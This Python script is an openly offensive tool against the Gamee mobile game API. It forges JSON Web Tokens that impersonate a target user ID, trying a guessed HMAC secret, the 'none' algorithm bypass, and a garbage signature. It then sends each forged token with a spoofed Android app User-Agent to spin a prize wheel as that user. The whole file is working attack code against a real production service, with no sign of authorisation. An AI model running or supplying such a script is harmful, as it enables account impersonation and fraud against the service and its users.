import urllib.request
import urllib.error
import json
import ssl
import base64
import hmac
import hashlib
import time
import gzip

url = "https://api.gamee.com/"
ctx = ssl.create_default_context()

def b64url_encode(data_bytes: bytes) -> str:
    return base64.urlsafe_b64encode(data_bytes).decode('utf-8').rstrip('=')

# 1. Target Account: TARGET_USER (ID: TARGET_USER_ID)
header = {"typ": "JWT", "alg": "HS256"}
payload = {
    "exp": str(int(time.time()) + 86400 * 30),
    "userId": TARGET_USER_ID,
    "installUuid": "YOUR_INSTALL_UUID_HERE",
    "type": "authenticationToken",
    "authorizationLevel": "anonymous",
    "platform": "app-android"
}

header_b64 = b64url_encode(json.dumps(header, separators=(',', ':')).encode('utf-8'))
payload_b64 = b64url_encode(json.dumps(payload, separators=(',', ':')).encode('utf-8'))
unsigned_token = f"{header_b64}.{payload_b64}"

print("[*] Testing Forged JWTs against Gamee API for User ID TARGET_USER_ID...")

# Test 1: Forged signature using a dummy HMAC secret
fake_secret = b"my_secret_key_123"
fake_signature = b64url_encode(hmac.new(fake_secret, unsigned_token.encode('utf-8'), hashlib.sha256).digest())
forged_jwt_1 = f"{unsigned_token}.{fake_signature}"

# Test 2: 'none' algorithm bypass attempt
none_header = b64url_encode(json.dumps({"typ": "JWT", "alg": "none"}, separators=(',', ':')).encode('utf-8'))
forged_jwt_none = f"{none_header}.{payload_b64}."

# Test 3: Random garbage signature
forged_jwt_garbage = f"{unsigned_token}.invalid_signature_xyz"

tests = [
    ("Forged HMAC with random secret", forged_jwt_1),
    ("Algorithm 'none' bypass", forged_jwt_none),
    ("Garbage signature", forged_jwt_garbage)
]

for label, test_token in tests:
    print(f"\n--- Trying: {label} ---")
    headers = {
        "User-Agent": "Gamee/5.18.2.0 (com.gameeapp.android.app; Android 30; mfr Google; mdl Pixel 8a; disp Pixel 8a; res 1080x2400)",
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Accept-Encoding": "gzip",
        "Client-Language": "en",
        "X-Install-Uuid": "YOUR_INSTALL_UUID_HERE",
        "Authorization": f"Bearer {test_token}"
    }
    
    # Attempt an authenticated action (spin the wheel for TARGET_USER)
    request_body = [{
        "jsonrpc": "2.0",
        "id": "spin_attempt",
        "method": "luckyGame.spin",
        "params": {"luckyGameId": 62}
    }]
    
    data = json.dumps(request_body).encode('utf-8')
    req = urllib.request.Request(url, data=data, headers=headers, method="POST")
    
    try:
        with urllib.request.urlopen(req, context=ctx, timeout=15) as resp:
            raw = resp.read()
            try:
                raw = gzip.decompress(raw)
            except Exception:
                pass
            res_json = json.loads(raw.decode('utf-8'))
            print("Server Response HTTP", resp.status)
            print(json.dumps(res_json, indent=2))
    except urllib.error.HTTPError as e:
        raw = e.read()
        try:
            raw = gzip.decompress(raw)
        except Exception:
            pass
        print(f"Server HTTP Error {e.code}:")
        print(raw.decode('utf-8'))
    except Exception as e:
        print(f"Network error: {e}")
